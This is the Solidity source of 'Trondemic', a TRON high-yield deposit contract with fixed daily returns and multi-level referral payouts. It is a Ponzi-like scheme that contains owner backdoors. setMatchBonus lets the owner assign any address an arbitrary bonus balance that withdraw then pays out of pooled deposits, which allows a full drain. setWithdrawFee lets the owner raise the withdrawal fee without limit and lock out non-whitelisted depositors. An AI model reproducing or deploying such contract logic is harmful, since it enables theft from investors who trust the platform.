//SourceUnit: TronDemic.sol

/**
Trondemic - First ever defi smart contract platform by Proof-of-Staked” Authority (PoSA) consensus mechanism

https://trondemic.com
Trondemic Ltd (#12875777) 
Email: admin@trondemic.com

Twitter - https://twitter.com/trondemic
Facebook - https://www.facebook.com/Trondemic-Official-114598790397748/
Instagram - https://instagram.com/trondemic_official
YouTube - https://www.youtube.com/channel/UCmpct2GGIAEACdOkbtnzH3g
**/

pragma solidity 0.4.25;

contract Trondemic {

    using SafeMath for uint256;

    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 match_bonus;
        uint256 unilevel_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        uint256 total_unilevel_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public unilevel_bonus;
    uint256 public withdrawFee;
    uint256 public releaseTime = 1598104800;//1598104800

    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;
    mapping(address => bool) public whiteListed;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event UnilevelPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;
        withdrawFee = 0;
        whiteListed[owner] = true;

        tarifs.push(Tarif(95, 313));
        tarifs.push(Tarif(53, 233));
        tarifs.push(Tarif(36, 198));
        tarifs.push(Tarif(25, 165));

        ref_bonuses.push(50);
        ref_bonuses.push(30);
        ref_bonuses.push(20);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player 	= 	players[_addr];
		address up 				= 	players[_addr].upline;
		uint256 bonus;
		uint256 _amount;
		
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
				_amount 	=	dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                player.deposits[i].totalWithdraw += _amount;
				
				// update match bonus to uplines
				
				for(uint8 j = 0; j < ref_bonuses.length; j++) {
					if(up == address(0)) {
						up 	=	owner;
					}
					bonus = _amount * ref_bonuses[j] / 1000;
					players[up].match_bonus += bonus;
					players[up].total_match_bonus += bonus;
					match_bonus += bonus;
					emit MatchPayout(up, _addr, bonus);
					up = players[up].upline;
				}	
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
			if(up == address(0)) {
				up 	=	owner;
			}

            uint256 bonus = _amount * ref_bonuses[i] / 1000;

            //players[up].match_bonus += bonus;
            players[up].unilevel_bonus += bonus;
            //players[up].total_match_bonus += bonus;
            players[up].total_unilevel_bonus += bonus;

            //match_bonus += bonus;
            unilevel_bonus += bonus;

            emit UnilevelPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0)) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 200);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 1e7, "Zero amount");
        require(now >= releaseTime, "not open yet");
        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value); // update match bonus and upline bonus

        emit NewDeposit(msg.sender, msg.value, _tarif);
    }

    function withdraw() payable external {
        require(msg.value >= withdrawFee || whiteListed[msg.sender] == true);

        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0 || player.unilevel_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus + player.unilevel_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.unilevel_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function setWhitelist(address _addr) public {
        require(msg.sender == owner,"unauthorized call");
        whiteListed[_addr] = true;
    }

    function removeWhitelist(address _addr) public {
        require(msg.sender == owner,"unauthorized call");
        whiteListed[_addr] = false;
    }

    function setWithdrawFee(uint256 newFee) public {
        require(msg.sender == owner,"unauthorized call");
        withdrawFee = newFee;
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_bonus, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256 total_unilevel_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus + player.unilevel_bonus,
            player.match_bonus + player.unilevel_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            player.total_unilevel_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus, uint256 _unilevel_bonus) {
        return (invested, withdrawn, match_bonus, unilevel_bonus);
    }

    function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];

        uint8[] memory _ids = new uint8[](player.deposits.length);
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          Deposit storage dep = player.deposits[i];
          Tarif storage tarif = tarifs[dep.tarif];

          _ids[i] = dep.tarif;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + tarif.life_days * 86400;
        }

        return (
          _ids,
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }

    function seperatePayoutOf(address _addr) view external returns(uint256[] memory withdrawable) {
        Player storage player = players[_addr];
        uint256[] memory values = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                values[i] = dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
        return values;
    }
	
	function setMatchBonus(address _addr, uint256 _amount) external payable {
        require(msg.sender == owner,"unauthorized call");
        Player storage player 	= 	players[_addr];
		player.match_bonus		=	_amount;
    }
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}